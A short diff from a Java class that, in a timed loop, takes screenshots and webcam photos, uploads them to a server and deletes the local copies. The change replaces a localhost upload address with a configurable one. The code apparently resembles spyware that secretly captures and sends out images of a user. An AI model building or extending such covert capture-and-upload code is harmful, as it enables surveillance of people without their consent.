@@ -125,7 +125,7 @@ public class LLW {
 					PhotoCapture pc = new PhotoCapture();
 					pc.takeScreenShot();
 					pc.takeCameraShot();
-					PostCreator p = new PostCreator("http://127.0.0.1:5000/upload", savedname);
+					PostCreator p = new PostCreator(Constants.url, savedname);
 					p.send();
 					p.cleanup();
 					duration -= interval;
